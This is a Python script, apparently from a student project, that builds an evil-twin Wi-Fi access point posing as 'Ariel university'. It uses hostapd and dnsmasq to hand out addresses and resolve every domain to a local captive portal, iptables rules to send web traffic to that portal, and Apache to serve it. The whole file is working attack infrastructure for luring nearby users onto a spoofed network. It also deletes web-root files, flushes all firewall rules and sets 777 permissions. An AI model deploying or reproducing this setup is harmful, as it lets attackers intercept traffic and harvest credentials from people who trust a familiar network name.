import os
import sys
import pathlib
import subprocess
import time
from threading import Thread

CAPTIVEPORTAL_IP = "192.168.24.1"


def create_dnsmasq_file(interface):
    global CAPTIVEPORTAL_IP
    # Disable all old proccess
    os.system('service dnsmasq stop >/dev/null 2>&1')
    os.system('killall dnsmasq >/dev/null 2>&1')

    # define dnsmasq.conf
    conf_text = \
        f"bogus-priv\n" \
        f"server=/localnet/{CAPTIVEPORTAL_IP}\n" \
        f"local=/localnet/\n" \
        f"interface={interface}\n" \
        f"domain=localnet\n" \
        f"dhcp-range=192.168.24.50,192.168.24.250,2h\n" \
        f"address=/www.google.com/216.58.209.2\n" \
        f"address=/#/{CAPTIVEPORTAL_IP}\n" \
        f"dhcp-option=1,255.255.255.0\n" \
        f"dhcp-option=3,{CAPTIVEPORTAL_IP}\n" \
        f"dhcp-option=6,{CAPTIVEPORTAL_IP}\n"
    f"dhcp-authoritative\n"

    conf_file = open("dnsmasq.conf", "w")
    conf_file.write(conf_text)
    conf_file.close()
    os.system('chmod 777 dnsmasq.conf')


def create_hostapd_file(interface, ssid="Ariel university", channel=1):
    # Disable all old proccess
    os.system('service hostapd stop >/dev/null 2>&1')
    os.system('killall hostapd >/dev/null 2>&1')

    # define hostapd.conf
    conf_text = f"interface={interface}\ndriver=nl80211\nssid={ssid}" \
                f"\nchannel={channel}\nmacaddr_acl=0\nignore_broadcast_ssid=0\n" \
                "wme_enabled=1"
    conf_file = open("hostapd.conf", "w")
    conf_file.write(conf_text)
    conf_file.close()

    os.system('chmod 777 hostapd.conf')


def start_apache():
    """
    this function forward our captive portal directory
    and start the apache2 server which will be our Main Server.
    also it defines the apache conf file (000-default).
    we've been helped with:

    """

    os.system('sudo rm -r /var/www/html/* 2>/dev/null')  # delete all folders and files in this directory
    os.system('sudo cp -r Captivportal/* /var/www/html')
    os.system('sudo chmod 777 /var/www/html/*')
    os.system('sudo chmod 777 /var/www/html')

    # update rules inside 000-default.conf of apache2
    os.system('sudo cp -f 000-default.conf /etc/apache2/sites-enabled')
    os.system('a2enmod rewrite >/dev/null 2>&1')  # enable the mod_rewrite in apache
    os.system('service apache2 restart >/dev/null 2>&1')     # reload and restart apache2

    print('\nappache server start successfully')
    time.sleep(1)


def set_settings(fap_iface, ssid, channel):
    """
    this function create 2 conf fils --> dnsmasq.conf, hostapd.conf
    also, it defines new rules in iptables
    """
    global CAPTIVEPORTAL_IP
    # Clear port 53
    os.system('systemctl disable systemd-resolved.service >/dev/null 2>&1')
    os.system('systemctl stop systemd-resolved>/dev/null 2>&1')

    create_hostapd_file(fap_iface, ssid, channel)
    create_dnsmasq_file(fap_iface)

    print('\ndnsmaq.conf & hostapd.conf create successfully')
    time.sleep(2)

    # AP with address 192.168.24.1 on the given interface
    os.system(f"ifconfig {fap_iface} up {CAPTIVEPORTAL_IP} netmask 255.255.255.0")

    # Clear all IP Rules
    os.system('iptables --flush')
    os.system('iptables --table nat --flush')
    os.system('iptables --delete-chain')
    os.system('iptables --table nat --delete-chain')

    # Redirect any request to the captive portal
    os.system(
        f'iptables -t nat -A PREROUTING  -i usb0 -p tcp --dport 80 -j DNAT  --to-destination {CAPTIVEPORTAL_IP}:80')
    os.system(
        f'iptables -t nat -A PREROUTING  -i usb0 -p tcp --dport 443 -j DNAT  --to-destination {CAPTIVEPORTAL_IP}:80')

    # Enable internet access use the usb0 interface
    os.system(f'iptables -A FORWARD --in-interface {fap_iface} -j ACCEPT')
    os.system(f'iptables -t nat -A POSTROUTING --out-interface usb0 -j MASQUERADE')

    # Initial wifi interface configuration (seems to fix problems)
    os.system(f'ip link set {fap_iface} down')
    os.system(f'ip addr flush dev {fap_iface}')
    os.system(f'ip link set {fap_iface} up')
    os.system(f'ip addr add 192.168.24.1/24 dev {fap_iface}')

    # Enable IP forwarding from one interface to another
    os.system('echo 1 > /proc/sys/net/ipv4/ip_forward')
    os.system(f'sleep 3')

    # Link dnsmasq to the configuration file.
    cmd = "sudo dnsmasq -C dnsmasq.conf"
    p = subprocess.Popen(cmd, shell=True, preexec_fn=os.setsid)

    os.system(f'route add default gw {CAPTIVEPORTAL_IP}')

    start_apache()

    os.system("hostapd hostapd.conf -B >/dev/null 2>&1")
